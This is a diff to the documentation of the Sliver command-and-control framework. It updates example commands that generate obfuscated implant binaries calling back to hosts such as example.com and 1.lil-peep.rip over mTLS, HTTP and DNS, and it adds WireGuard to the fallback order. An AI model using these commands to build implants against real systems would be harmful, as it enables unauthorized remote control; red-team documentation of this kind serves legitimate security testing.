@@ -50,11 +50,10 @@ Sliver implants are cross-platform, you can change the compiler target with the 
 WARNING: Some commands/features may not work on "unsupported" platforms.
 
 ```
-sliver > generate --mtls example.com --save /Users/moloch/Desktop --skip-symbols --os mac
+sliver > generate --mtls example.com --save /Users/moloch/Desktop --os mac
 
 [*] Generating new darwin/amd64 Sliver binary
-[!] Symbol obfuscation is disabled
-[*] Build completed in 00:00:03
+[*] Build completed in 00:00:09
 [*] Sliver binary saved to: /Users/moloch/Desktop/PROPER_ANTHONY
 ```
 
@@ -126,7 +125,7 @@ PROPER_ANTHONY            6.3 MiB
 
 ## Multiple Domains/Protocols
 
-You can specify multiple domains and protocols during the generation process. Right now Sliver will attempt to use the most performant protocols first (MTLS -> HTTP(S) -> DNS) using subsequent domains/protocols when connections fail.
+You can specify multiple domains and protocols during the generation process. Right now Sliver will attempt to use the most performant protocols first (MTLS -> WG -> HTTP(S) -> DNS) using subsequent domains/protocols when connections fail.
 
 ```
 sliver > generate --mtls example.com --http foobar.com --dns 1.lil-peep.rip
